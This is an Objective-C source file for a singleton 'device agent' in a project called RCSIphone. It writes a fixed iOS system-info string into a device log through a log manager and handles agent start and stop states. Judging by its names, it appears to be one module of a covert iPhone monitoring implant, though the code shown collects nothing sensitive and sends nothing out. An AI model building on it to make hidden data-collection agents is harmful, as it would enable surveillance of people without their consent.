//
//  RCSIAgentDevice.m
//  RCSIphone
//
//  Created by kiodo on 3/11/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//
#import "RCSIAgentDevice.h"
#import "RCSICommon.h"
#import "RCSITaskManager.h"

//#define DEBUG_DEVICE

NSString *kSPHardwareDataType     = @"SPHardwareDataType";
NSString *kSPApplicationsDataType = @"SPApplicationsDataType";

static RCSIAgentDevice *sharedAgentDevice = nil;

@implementation RCSIAgentDevice

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (RCSIAgentDevice *)sharedInstance
{
  @synchronized(self)
  {
    if (sharedAgentDevice == nil)
    {
      //
      // Assignment is not done here
      //
      [[self alloc] init];
    }
  }
  
  return sharedAgentDevice;
}

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
  {
    if (sharedAgentDevice == nil)
    {
      sharedAgentDevice = [super allocWithZone: aZone];
      
      //
      // Assignment and return on first allocation
      //
      return sharedAgentDevice;
    }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (id)retain
{
  return self;
}

- (unsigned)retainCount
{
  // Denotes an object that cannot be released
  return UINT_MAX;
}

- (void)release
{
  // Do nothing
}

- (id)autorelease
{
  return self;
}

#pragma mark -
#pragma mark Agent Formal Protocol Methods
#pragma mark -

- (NSData*)getSystemInfoWithType: (NSString*)aType
{
  NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
  
  NSData *retData = nil;
  NSString *systemInfoStr = nil;

  systemInfoStr = [[NSString alloc] initWithFormat: @"%s", "OS type:\n\tiOS"];

  retData = [[systemInfoStr dataUsingEncoding: NSUTF16LittleEndianStringEncoding] retain];
  
#ifdef  DEBUG_DEVICE
    NSLog(@"%s: HW INFO retData %@", __FUNCTION__, retData);
#endif

  [pool release];
  
  return retData;
}

- (BOOL)writeDeviceInfo: (NSData*)aInfo
{
  NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
  
  NSString *tmpUTF16Info = nil;
  
  if (aInfo == nil)
  {
    [pool release];
    return NO;
  }
  
  RCSILogManager *logManager = [RCSILogManager sharedInstance];
  
  BOOL success = [logManager createLog: LOGTYPE_DEVICE
                           agentHeader: nil
                             withLogID: 0];
#ifdef DEBUG_DEVICE
  NSLog(@"%s: writing log", __FUNCTION__);
#endif 
  
  if (success == TRUE)
  {

    tmpUTF16Info = [[NSString alloc]initWithData: aInfo
                                        encoding: NSUTF16LittleEndianStringEncoding];

    if (tmpUTF16Info == nil)
      tmpUTF16Info =  [[NSString alloc] initWithFormat: @"%@", @"no information"];
  
    NSMutableData *tmpData = 
    (NSMutableData*)[tmpUTF16Info dataUsingEncoding: NSUTF16LittleEndianStringEncoding];

    [tmpUTF16Info release];
    
    if (tmpData == nil) 
    {
      NSString *nullInfo = [[NSString alloc] initWithFormat: @"%@", @"no information"];
      tmpData = (NSMutableData*)[nullInfo dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
      [nullInfo release];
    }
    
#ifdef DEBUG_DEVICE
    NSLog(@"%s: tmpData %@", __FUNCTION__, tmpData);
#endif
    
    [logManager writeDataToLog: tmpData
                      forAgent: LOGTYPE_DEVICE
                     withLogID: 0];
    
    [logManager closeActiveLog: LOGTYPE_DEVICE
                     withLogID: 0];
  }
  else
  {
#ifdef DEBUG_DEVICE
    NSLog(@"%s: error creating logs", __FUNCTION__);
#endif
  }
  
  [pool release];
  
  return YES;
}

- (BOOL)getDeviceInfo
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSData *infoStr = [self getSystemInfoWithType: kSPHardwareDataType];
  
  if (infoStr != nil)
    [self writeDeviceInfo: infoStr];
  
  [infoStr release];
  
  [pool release];
  
  return YES;
}

- (void)start
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
#ifdef DEBUG_DEVICE
  NSLog(@"%s: Agent device started", __FUNCTION__);
#endif
  
  [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
  
  if ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOP &&
      [mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED)
  {
    NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];

    [self getDeviceInfo];
    
    [innerPool release];
  }

    [mAgentConfiguration setObject: AGENT_STOPPED
                            forKey: @"status"];
  
  [outerPool release];
}

- (BOOL)stop
{
  int internalCounter = 0;
  
  [mAgentConfiguration setObject: AGENT_STOP
                          forKey: @"status"];
  
  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED
         && internalCounter <= 5)
  {
    internalCounter++;
    sleep(1);
  }
  
  return YES;
}

- (BOOL)resume
{
  return YES;
}

#pragma mark -
#pragma mark Getter/Setter
#pragma mark -

- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
{
  if (aConfiguration != mAgentConfiguration)
  {
    [mAgentConfiguration release];
    mAgentConfiguration = [aConfiguration retain];
  }
}

- (NSMutableDictionary *)mAgentConfiguration
{
  return mAgentConfiguration;
}

@end
